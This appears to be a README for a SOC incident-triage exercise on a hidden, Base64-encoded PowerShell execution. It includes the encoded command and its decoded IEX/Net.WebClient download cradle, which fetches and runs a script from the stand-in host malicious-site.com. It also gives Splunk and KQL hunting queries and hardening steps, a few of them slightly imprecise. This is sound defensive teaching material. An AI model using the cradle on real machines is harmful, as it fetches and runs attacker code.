# EDR-PowerShell-Triage-and-SIEM-Hunting

SOC Tier-1 endpoint incident triage analyzing obfuscated Base64 PowerShell execution, extracting network IoCs, and engineering Splunk SPL threat-hunting queries.

---

## Incident Summary & Initial Detection

- **Host Affected:** Finance Workstation (`FIN-WS-04`)
- **Initial Alert Severity:** Medium (EDR Trigger: Suspicious Process Execution)
- **Parent / Child Process:** `explorer.exe` ➔ `powershell.exe`
- **Telemetry Detected:**
  ```text
  powershell.exe -NoP -NonI -W Hidden -Enc aQBFAHgAIAAOAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBzAGkAdABIAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBKAC4AcABzADEAJwApAA==
  ```

--- 

## Forensic De-obfuscation & Threat Analysis

### 1. Execution Flag Decomposition
Attackers routinely leverage built-in Windows administrative utilities ("Living off the Land" / LotL) to bypass execution controls:
- `-NoP` (`-NoProfile`): Prevents PowerShell from loading user profiles to evade administrative logon scripts.
- `-NonI` (`-NonInteractive`): Suppresses interactive prompts from displaying to the logged-in user.
- `-W Hidden` (`-WindowStyle Hidden`): Runs the process entirely in the background without spawning a GUI window.
- `-Enc` (`-EncodedCommand`): Accepts a Base64-encoded UTF-16LE string to evade basic string-matching inspection.

### 2. Payload De-obfuscation
Decoding the Base64 command reveals an in-memory script-stager:
```powershell
IEX (New-Object Net.WebClient).DownloadString('[http://malicious-site.com/payload.ps1](http://malicious-site.com/payload.ps1)')
```
- **Execution Mechanism**: Uses `Invoke-Expression` (`IEX`) paired with .NET's `Net.WebClient` to fetch an external `.ps1` payload directly into memory without writing the raw script file to disk (Fileless Execution).
- **Extracted Indicator of Compromise (IoC)**:
  - **Malicious Domain**: `malicious-site[.]com`
  - **URI**: `http://malicious-site[.]com/payload.ps1`

---

## SIEM Threat Hunting Queries

Rather than hunting solely for exact string matches that change per campaign, detection queries prioritize behavior (anomalous CLI arguments and network handshakes).

### Splunk SPL: Detecting Suspicious PowerShell Execution Arguments
```text
index=endpoint sourcetype="WinEventLog:Security" EventCode=4688
| process_name="powershell.exe"
| where match(process_command_line, "(?i)-w\s+hidden") 
     OR match(process_command_line, "(?i)-enc") 
     OR match(process_command_line, "(?i)downloadstring")
| stats count min(_time) as first_seen max(_time) as last_seen by host, user, process_command_line
| sort - count
```

### Splunk SPL: Identifying Outbound C2 Network Activity
```text
index=network sourcetype="pan:traffic" OR sourcetype="cisco:asa"
| search dest_ip="malicious-site.com" OR dest_header="*malicious-site.com*"
| stats count by src_ip, dest_ip, dest_port, action
```

### Azure Sentinel (KQL): Correlated Process and Network Trace
```text
DeviceProcessEvents
| where ProcessCommandLine has_any ("-EncodedCommand", "-Enc", "-W Hidden") 
    and FileName =~ "powershell.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

---

## Remediation & Endpoint Hardening

### 1. Immediate Host Containment:
- Isolated workstation `FIN-WS-04` from the enterprise VLAN via EDR network containment to sever outbound C2 callbacks.
- Submitted `malicious-site[.]com` to boundary firewalls, DNS-sinkhole filters, and proxy blacklists.

### 2. Endpoint Hardening:
- Enforce Constrained Language Mode (CLM): Restrict PowerShell scripting capabilities across non-administrative users to disable custom .NET object creation (`Net.WebClient`).
- AppLocker / Windows Defender Application Control (WDAC): Prevent unauthorized script invocation in user-writable paths.
- Script Block Logging (Event ID 4104): Ensure full transcription and script-block telemetry ingestion into SIEM to decrypt `-Enc` strings automatically prior to execution.
